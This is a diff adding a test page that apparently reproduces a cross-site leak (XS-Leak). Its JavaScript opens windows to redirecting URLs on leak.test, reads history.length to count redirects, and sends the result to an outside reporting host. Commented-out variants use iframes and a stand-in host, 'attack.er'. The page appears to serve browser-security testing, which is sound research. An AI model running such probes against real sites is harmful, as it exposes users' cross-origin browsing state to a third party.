@@ -1,0 +1,60 @@
+<script>
+    window.onload = function () {
+        var results = [];
+
+        function run(url, cb) {
+            var win = open(url);
+            setTimeout(function (e) {
+                win.location = "about:blank";
+                setTimeout(function (e) {
+                    console.log(win.history.length);
+                    results.push(win.history.length);
+                    win.close();
+                    cb();
+                }, 1500);
+            }, 3000);
+        }
+
+        function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case4.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "eight_redirects": results[0],
+                "sixteen_redirects": results[1],
+                "xsleak_reproduced": results[0] === 10 && results[1] === 18
+            })));
+            xhr.send();
+        }
+
+        run("https://leak.test/client_redirect/8/", function () {
+            run("https://leak.test/client_redirect/16/", report);
+        });
+    };
+</script>
+
+
+<!--<iframe src="https://leak.test/client_redirect/8/"></iframe>
+<script>
+    setTimeout(function (e) {
+            frames[0].location = "about:blank";
+            setTimeout(function (e) {
+                console.log(frames[0].history.length);
+            }, 1500);
+        }, 1500);
+</script>-->
+
+<!--<script>
+    window.onload = function () {
+        var eight_redirects = -1;
+        var iframe1 = document.createElement("iframe");
+        document.body.appendChild(iframe1);
+        iframe1.src = "https://leak.test/redirect/0/";
+        setTimeout(function (e) {
+            iframe1.src = "https://attack.er/"
+        }, 2000);
+        setTimeout(function (e) {
+            eight_redirects = iframe1.contentWindow.history.length;
+            console.log("%d redirects detected", eight_redirects);
+        }, 3000);
+    }
+</script>-->
